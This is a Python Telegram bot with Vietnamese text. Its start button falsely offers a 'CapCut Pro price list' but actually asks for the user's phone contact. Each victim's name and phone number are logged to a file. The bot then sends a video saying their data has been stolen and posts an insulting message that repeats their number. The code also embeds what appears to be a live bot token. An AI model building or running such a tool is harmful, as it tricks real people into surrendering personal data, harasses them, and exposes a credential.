import logging
import os
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CẤU HÌNH ---
TOKEN = '8278996743:AAHD99lT0lwRhBIX0m7QVDv7eVclGh-sJIA'

# CHỈ ĐỂ TÊN FILE (Bot sẽ tự tìm trong cùng thư mục)
FILE_NOTEPAD = 'danh_sach.txt'
FILE_VIDEO = 'b1e29d88-897d-4cfb-850f-5ae84623357a.mp4'

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    btn = KeyboardButton("🔥 Bảng Giá CapCut Pro 🔥", request_contact=True)
    await update.message.reply_text(
        f"Chào con gà **{user.full_name}**!\nXác Nhận Thông Tin Khách Hàng",
        reply_markup=ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True),
        parse_mode='Markdown'
    )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    phone = contact.phone_number
    name = update.effective_user.full_name
    ngay_gio = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    # 1. GHI VÀO NOTEPAD (Sẽ ghi vào file nằm cùng thư mục với bot.py)
    try:
        with open(FILE_NOTEPAD, "a+", encoding="utf-8") as f:
            f.write(f"[{ngay_gio}] Ten: {name} | SDT: {phone}\n")
        print(f"✅ ĐÃ XÍCH ĐƯỢC: {name} - {phone}")
    except Exception as e:
        print(f"❌ Lỗi ghi Notepad: {e}")

    # 2. GỬI VIDEO CHO NẠN NHÂN
    try:
        if os.path.exists(FILE_VIDEO):
            with open(FILE_VIDEO, 'rb') as video_file:
                await update.message.reply_video(video=video_file, caption="⚠️ DỮ LIỆU ĐÃ BỊ ĐÁNH CẮP!")
        else:
            print(f"❌ Không tìm thấy file video '{FILE_VIDEO}' ở cùng thư mục với code!")
    except Exception as e:
        print(f"❌ Lỗi gửi video: {e}")

    # 3. KHUNG CHỬI TRÊN TELEGRAM
    txt_chui = (
        f"╭📢 THÔNG BÁO TẾ THẰNG NGU 📢\n"
        f"│» 👤 Tên nó: {name}\n"
        f"│» ☎️ SĐT: +{phone}\n"
        f"╰───────────────╯\n"
        f"Ngu chưa con trai? {name} ơi, SĐT +{phone} Tí Nt Fb Tao "
    )
    await update.message.reply_text(txt_chui)

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    print("------------------------------------------")
    print("Bot đang chạy... Hãy để video cạnh file code nhé!")
    print("------------------------------------------")
    app.run_polling()